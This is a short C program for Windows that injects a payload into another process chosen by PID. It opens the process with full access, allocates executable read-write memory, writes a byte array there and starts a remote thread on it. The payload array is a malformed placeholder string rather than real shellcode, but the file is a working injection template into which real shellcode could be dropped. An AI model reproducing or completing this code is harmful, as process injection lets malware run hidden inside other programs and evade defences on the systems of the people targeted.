#include <stdio.h>
#include <windows.h>


const char* OK = "[+]";
const char* INFO = "[*]";
const char* ERR = "[-]";

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char shlcd[] = "x6e/x69/x72/x61/x6e/x6a/x61/x6e";
int main(int argc, char* argv[])
{
	/*proces error catch*/
	if (argc < 2)
	{
		printf("%s usage : %s <PID>",ERR, *argv);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s opening a handle to (%ld)\n", INFO, PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);
	/*Process handle creation*/
	if (hProcess == NULL)
	{
		printf("%s couldnt get a handle to the process (%ld) error : %ld", ERR, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process\n\\---0x%p\n", OK, hProcess);
	/*blocking memory for alloc*/

	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shlcd), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE perms\n", OK, sizeof(shlcd));

	WriteProcessMemory(hProcess, rBuffer, shlcd, sizeof(shlcd), NULL);
	printf("% s wrote %zu -bytes to process memory\n", OK, sizeof(shlcd));

	/*thread to run the payload*/

	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL)
	{
		printf("%s couldn't get a handle to the thread (%ld) error: %ld", ERR, TID, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", OK, TID, hThread);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;
}